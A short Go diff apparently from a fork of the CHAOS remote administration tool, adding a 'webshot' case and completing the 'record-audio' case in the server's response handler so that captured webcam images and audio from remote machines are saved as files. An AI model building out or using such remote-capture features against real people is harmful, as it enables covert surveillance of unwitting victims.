@@ -6,6 +6,7 @@ import (
 	"os/exec"
 	"strings"
 	"time"
+	"reflect"
 
 	"github.com/google/uuid"
 	"github.com/justadoll/CHAOS/internal/utils"
@@ -85,6 +86,15 @@ func HandleResponse(payload *payload.Data) (*payload.Data, error) {
 		break
 	case "record-audio":
 		file, err := audio.WriteWav(payload.Response)
+		if err != nil {
+			return nil, err
+		}
+		payload.Response = utils.StringToByte(file)
+		break
+	case "webshot":
+		fmt.Println("[server] Webshot!")
+		fmt.Println("payload.Response type:", reflect.TypeOf(payload.Response))
+		file, err := image.WritePNG(payload.Response)
 		if err != nil {
 			return nil, err
 		}
